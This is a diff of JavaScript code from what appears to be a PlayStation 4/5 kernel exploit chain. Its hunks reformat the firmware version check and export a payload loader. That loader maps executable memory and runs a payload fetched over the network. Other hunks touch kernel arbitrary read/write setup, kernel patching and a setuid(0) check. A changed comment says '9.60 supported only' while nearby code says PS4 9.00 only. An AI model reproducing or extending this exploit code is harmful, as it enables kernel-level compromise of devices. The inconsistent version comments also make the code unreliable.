@@ -49,30 +49,28 @@ const t1 = performance.now();
 
 // check if we are running on a supported firmware version
 const [is_ps4, version] = (() => {
-  const value = config.target;
-  const is_ps4 = (value & 0x10000) === 0;
-  const version = value & 0xffff;
-  const [lower, upper] = (() => {
-    if (is_ps4) {
-      return [0x100, 0x1250];
-    } else {
-      return [0x100, 0x1020];
+    const value = config.target;
+    const is_ps4 = (value & 0x10000) === 0;
+    const version = value & 0xffff;
+    const [lower, upper] = (() => {
+        if (is_ps4) {
+            return [0x100, 0x1250];
+        } else {
+            return [0x100, 0x1020];
+        }
+    })();
+
+    if (!(lower <= version && version < upper)) {
+        throw RangeError(`invalid config.target: ${hex(value)}`);
     }
-  })();
 
-  if (!(lower <= version && version < upper)) {
-    throw RangeError(`invalid config.target: ${hex(value)}`);
-  }
-
-  log(`Console: PS${is_ps4 ? "4" : "5"} | Firmware: ${hex(version)}`);
-
-  return [is_ps4, version];
+    return [is_ps4, version];
 })();
 
 // set per-console/per-firmware offsets
 const fw_config = (() => {
-  if (is_ps4) {
-  if (0x900 <= version && version < 0x903) {
+    if (is_ps4) {
+    if (0x900 <= version && version < 0x903) {
       // 9.00
       return fw_ps4_900;
     } else if (0x903 <= version && version < 0x950) {
@@ -122,7 +120,7 @@ function array_from_address(addr, size) {
     return og_array;
 }
 
-function toogle_payload(PLfile) {
+export function toogle_payload(PLfile) {
  var loader_addr = chain.sysp('mmap', 0, 0x1000, 7, 0x41000, -1, 0);
  var tmpStubArray = array_from_address(loader_addr, 1);
  tmpStubArray[0] = 0x00C3E7FF;
@@ -133,7 +131,7 @@ function toogle_payload(PLfile) {
  req.onreadystatechange = function () {
   if (req.readyState == 4) {
    var PLD = req.response;
-   var payload_buffer = chain.sysp('mmap', 0, PLD.byteLength*4, 7, 0x41000, -1, 0);
+   var payload_buffer = chain.sysp('mmap', 0, PLD.byteLength*4, 7, 0x1002, -1, 0);
    var pl = array_from_address(payload_buffer, PLD.byteLength*4);
    var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
    var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
@@ -1324,7 +1322,6 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     }
 
     // Only For PS4 9.00
-
     const kbase = kernel_addr.sub(off_kstr);
     log(`kernel base: ${kbase}`);
 
@@ -1588,7 +1585,7 @@ async function get_patches(url) {
     return response.arrayBuffer();
 }
 
-// 9.00 supported only
+// 9.60 supported only
 async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     if (!is_ps4) {
         throw RangeError('PS5 kernel patching unsupported');
@@ -1617,7 +1614,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     const buf = await get_patches(patch_elf_loc);
     // FIXME handle .bss segment properly
     // assume start of loadable segments is at offset 0x1000
-    const patches = new View1(await buf, 0x1000);    
+    const patches = new View1(await buf, 0x1000);
     let map_size = patches.size;
     const max_size = 0x10000000;
     if (map_size > max_size) {
@@ -1741,6 +1738,7 @@ export async function kexploit() {
         if (sysi('setuid', 0) == 0) {
             log("Not running kexploit again.");
             load_exploit_success();
+            //Exploit_done();
             return;
         }
     }
